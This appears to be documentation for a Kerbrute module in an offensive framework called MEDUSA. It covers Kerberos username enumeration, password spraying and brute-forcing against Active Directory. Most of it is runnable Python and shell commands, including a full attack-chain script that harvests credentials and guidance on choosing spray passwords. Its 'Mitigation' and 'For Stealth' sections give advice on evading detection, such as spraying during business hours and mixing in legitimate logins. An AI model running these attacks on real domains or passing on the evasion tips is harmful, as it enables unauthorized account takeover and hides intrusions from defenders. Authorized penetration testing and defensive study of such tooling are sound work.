# Kerbrute Integration

## Overview

Kerbrute is a fast Kerberos authentication brute-forcing tool for Active Directory environments. It enables user enumeration and password attacks without triggering account lockouts.

**Purpose**: Enumerate valid AD users and attempt authentication  
**Phase**: Initial Access (Stage 3)  
**Risk Level**: MEDIUM (enumeration) / HIGH (authentication)  
**Approval**: Required for all operations

## How Kerbrute Works in MEDUSA

Kerbrute leverages Kerberos pre-authentication failures to:
1. **Enumerate** valid usernames without lockout risk
2. **Spray** single passwords across many users efficiently
3. **Bruteforce** passwords for specific users safely

All operations are faster than traditional LDAP or SMB-based attacks.

## Kerbrute Modes

### Mode 1: User Enumeration (userenum)

Discovers valid usernames via Kerberos AS-REQ failures.

```python
result = await client.enumerate_kerberos_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="/path/to/users.txt"
)
```

**Characteristics:**
- ✅ No account lockouts possible
- ✅ Fast (can test 1000s quickly)
- ✅ Detects ASREProastable users
- ⚠️ MEDIUM risk - creates auth logs
- Requires HIGH risk approval if policy-restricted

### Mode 2: Password Spray (passwordspray)

Tests single password against many users.

```python
result = await client.spray_kerberos_password(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="/path/to/users.txt",
    password="Password123"
)
```

**Characteristics:**
- ⚠️ Can trigger account lockouts
- ✅ Faster than SMB spray
- ✅ Single-threaded to avoid locks
- ⚠️ HIGH risk - obvious attack pattern
- Requires explicit approval

### Mode 3: Bruteforce (bruteuser)

Attempts many passwords for single user.

```python
from medusa.tools.kerbrute import KerbruteScanner

scanner = KerbruteScanner()

result = await scanner.bruteforce_user(
    dc="10.0.0.1",
    domain="corp.local",
    username="admin",
    passwordlist="/path/to/passwords.txt",
    threads=1  # Single thread to avoid lockout
)
```

**Characteristics:**
- ⚠️ CRITICAL risk - high lockout probability
- ✗ Slow with account lockout policies
- ✗ Creates obvious attack logs
- Requires CRITICAL risk approval

## Usage

### User Enumeration

```python
from medusa.client import MedusaClient

client = MedusaClient(...)

# Quick enumeration
result = await client.enumerate_kerberos_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt"
)

# Check for valid users
valid_users = [f for f in result['findings'] if f.get('valid')]
print(f"Found {len(valid_users)} valid users")

# Check for ASREProastable users (no preauth required)
asrep = [f for f in result['findings'] if f.get('asrep_roastable')]
print(f"ASREProastable users: {len(asrep)}")
```

### Safe Password Spray

```python
# Careful password spray (low risk approach)
result = await client.spray_kerberos_password(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    password="Welcome123!"  # Common default
)

# Check for successful logins
successes = [f for f in result['findings'] if f.get('successful')]
if successes:
    for cred in successes:
        print(f"✓ {cred['username']} : {cred['password']}")
```

### Direct Tool Usage

```python
from medusa.tools.kerbrute import KerbruteScanner

scanner = KerbruteScanner()

# User enumeration
result = await scanner.enumerate_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    threads=10,
    rate_limit=100  # ms delay between attempts
)

# Safe password spray
result = await scanner.safe_spray(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    password="DefaultPassword123"
)
```

## Output Format

### User Enumeration Results

```json
{
  "success": true,
  "findings": [
    {
      "type": "kerberos_user",
      "username": "jsmith",
      "domain": "corp.local",
      "valid": true,
      "requires_preauth": false,
      "asrep_roastable": true,
      "severity": "medium",
      "confidence": "high"
    },
    {
      "type": "kerberos_user",
      "username": "admin",
      "domain": "corp.local",
      "valid": true,
      "requires_preauth": true,
      "asrep_roastable": false,
      "severity": "low",
      "confidence": "high"
    }
  ],
  "metadata": {
    "mode": "userenum",
    "valid_users": 42,
    "asrep_roastable": 5
  }
}
```

### Password Spray Results

```json
{
  "success": true,
  "findings": [
    {
      "type": "kerberos_credentials",
      "username": "jsmith",
      "password": "Welcome123",
      "domain": "corp.local",
      "successful": true,
      "severity": "high",
      "confidence": "high"
    }
  ],
  "metadata": {
    "mode": "passwordspray",
    "successful_logins": 1,
    "attempts": 42
  }
}
```

## Configuration Options

### Enumeration

| Option | Values | Default | Description |
|--------|--------|---------|-------------|
| `dc` | IP/hostname | Required | Domain Controller |
| `domain` | string | Required | Domain name (corp.local) |
| `userlist` | filepath | Required | File with usernames |
| `threads` | int | 10 | Concurrent threads |
| `rate_limit` | int | None | Delay in ms |

### Password Operations

| Option | Values | Default | Description |
|--------|--------|---------|-------------|
| `password` | string | Required | Password to test |
| `passwordlist` | filepath | Required | File with passwords |
| `rate_limit` | int | 500 | Delay between attempts (ms) |
| `threads` | int | 5 | Concurrent threads (low to avoid lockout) |

## Command Line Usage

### User Enumeration

```bash
kerbrute userenum -dc 10.0.0.1 -d corp.local users.txt
```

### Safe Password Spray

```bash
kerbrute passwordspray -dc 10.0.0.1 -d corp.local users.txt 'Welcome123'
```

### Bruteforce Single User

```bash
kerbrute bruteuser -dc 10.0.0.1 -d corp.local admin passwords.txt
```

## Security Considerations

### Account Lockout Protection

Kerbrute is safer than traditional attacks because:
- ✅ No account lockout on failed enumeration
- ✅ Single failed auth doesn't lock account
- ⚠️ Multiple spray attempts still risk lockout

**Best Practice**: Conservative spray with rate limiting

```python
# Safe approach
result = await client.spray_kerberos_password(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    password="Welcome123"  # Single password only
)
# Rate limiting is built-in via threads=5
```

### Detection & Logging

⚠️ **High visibility:**
- All Kerberos AS-REQ failures logged
- Multiple failures from same source = obvious attack
- EDR/Siem tools detect patterns

**Mitigation:**
- Use legitimate user context if possible
- Spray during business hours (less suspicious)
- Mix in legitimate authentication attempts
- Use low thread counts

### Privilege Requirements

- DC Reachability: Network access to port 88 (Kerberos)
- No domain membership required
- No credentials needed for enumeration
- Post-auth operations need valid creds

## Workflow Integration

### Complete AD Attack Chain

```python
# Step 1: Enumerate valid users (MEDIUM risk)
enum_result = await client.enumerate_kerberos_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="top-1000-users.txt"
)

valid_users = [f['username'] for f in enum_result['findings'] if f['valid']]

# Step 2: Identify ASREProastable users
asrep_users = [
    f['username'] for f in enum_result['findings'] 
    if f.get('asrep_roastable')
]

if asrep_users:
    print(f"ASREProastable users found (can crack offline): {asrep_users}")

# Step 3: Safe password spray (HIGH risk)
spray_result = await client.spray_kerberos_password(
    dc="10.0.0.1",
    domain="corp.local",
    userlist=valid_users,
    password="Welcome123"  # Try common password
)

credentials = [f for f in spray_result['findings'] if f['successful']]
if credentials:
    print("Credentials found!")
    for cred in credentials:
        print(f"  {cred['username']}:{cred['password']}")
```

## Troubleshooting

### DC Not Reachable

```bash
# Test connectivity
nmap -p 88 10.0.0.1  # Kerberos port
nc -zv 10.0.0.1 88
```

### No Valid Users Found

```python
# Check userlist format (one per line)
with open("users.txt") as f:
    users = [line.strip() for line in f]
    print(f"Testing {len(users)} users")

# Verify domain name
# Use "corp" not "corp.local" if DC reports as "corp"
```

### Spray Detecting Lockouts

```python
# Reduce thread count and add delay
result = await scanner.safe_spray(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    password="Welcome123"
)
# Automatically uses threads=5 and rate_limit=500
```

## Preparation

### User List Sources

1. **Company Directory** (if available)
   ```bash
   # Parse email format
   grep -o '[a-z]*\.' emails.txt | sed 's/\.//' | sort -u
   ```

2. **Common Username Patterns**
   ```
   - firstname.lastname
   - firstnamelastname
   - first_last
   - first
   - finitiallast
   ```

3. **Word Lists**
   ```bash
   wget https://raw.githubusercontent.com/statistically/common-words/master/words.txt
   ```

### Password Selection

For spray, target:
- Default/template passwords
- Seasonal patterns (Winter2024, Company2025)
- Common patterns (Welcome123, Password1)
- Avoid obvious passwords (123456, password)

## Performance Tuning

### For Large User Lists (10,000+)

```python
# More threads (carefully)
result = await scanner.enumerate_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="large_users.txt",
    threads=50,  # Higher but monitor DC load
    rate_limit=50  # Shorter delay
)
```

### For Stealth

```python
# Single-threaded, long delays
result = await scanner.enumerate_users(
    dc="10.0.0.1",
    domain="corp.local",
    userlist="users.txt",
    threads=1,  # Single thread
    rate_limit=1000  # 1 second between
)
```

## Installation

### Go Binary
```bash
go install github.com/ropnop/kerbrute@latest
```

### From Source
```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make linux64  # or macos, windows
```

### Docker
```bash
docker run --rm -v /path:/path ghcr.io/ropnop/kerbrute:latest
```

## References

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [Using Kerbrute](https://www.whiteoaksecurity.com/blog/hunting-for-asreproastable-users/)
- [MITRE ATT&CK T1589.001](https://attack.mitre.org/techniques/T1589/001/)
- [ASREProast Attack](https://blog.harmj0y.net/activedirectory/asreproasting/)

